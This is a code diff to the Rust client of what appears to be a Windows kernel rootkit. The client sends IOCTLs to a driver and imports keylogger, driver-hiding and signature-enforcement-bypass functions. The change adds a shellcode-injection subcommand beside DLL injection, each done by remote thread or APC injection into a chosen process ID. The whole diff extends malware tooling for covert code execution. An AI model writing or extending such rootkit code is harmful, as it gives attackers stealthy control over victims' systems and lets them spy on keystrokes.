@@ -2,7 +2,7 @@ use {
     clap::Parser, 
     shared::ioctls::*,
     module::enumerate_module,
-    cli::{Cli, Commands, ProcessCommands, ThreadCommands}, 
+    cli::{Cli, Commands, ProcessCommands, ThreadCommands, InjectionCommands, Injection}, 
     driver::{dse, enumerate_driver, unhide_hide_driver}, 
     keylogger::keylogger, 
     process::{
@@ -203,15 +203,27 @@ fn main() {
                 },
             }
         },
-        Commands::Injection { pid, path, type_ } => {
-            match type_ {
-                cli::Injection::Thread => {
-                    injection_thread(IOCTL_INJECTION_THREAD, pid, path);
-                },
-                cli::Injection::APC => {
-                    injection_apc(IOCTL_INJECTION_APC, pid, path);
+        Commands::Injection { sub_command } => match sub_command {
+            InjectionCommands::DLL { pid, path, type_ } => {
+                match type_ {
+                    Injection::Thread => {
+                        injection_thread(IOCTL_INJECTION_DLL_THREAD, pid, path)
+                    },
+                    Injection::APC => {
+                        injection_apc(IOCTL_INJECTION_DLL_APC, pid, path)
+                    },
                 }
-            }
+            },
+            InjectionCommands::Shellcode { pid, path, type_ } => {
+                match type_ {
+                    Injection::Thread => {
+                        injection_thread(IOCTL_INJECTION_SHELLCODE_THREAD, pid, path)
+                    },
+                    Injection::APC => {
+                        injection_apc(IOCTL_INJECTION_SHELLCODE_APC, pid, path);
+                    }
+                }
+            },
         }
     }
 }
